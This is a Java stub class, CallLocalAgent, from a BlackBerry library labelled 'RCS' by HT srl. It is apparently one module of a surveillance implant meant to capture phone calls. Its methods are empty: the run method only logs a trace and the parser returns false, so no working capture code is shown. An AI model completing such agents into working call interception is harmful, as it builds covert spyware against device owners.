//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallLocalAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class CallLocalAgent.
 */
public final class CallLocalAgent extends Agent {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallLocalAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new call local agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CallLocalAgent(final boolean agentStatus) {
        super(Agent.AGENT_CALL_LOCAL, agentStatus, true, "CallLocalAgent");
    }

    /**
     * Instantiates a new call local agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CallLocalAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG_TRACE
        debug.trace("run");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
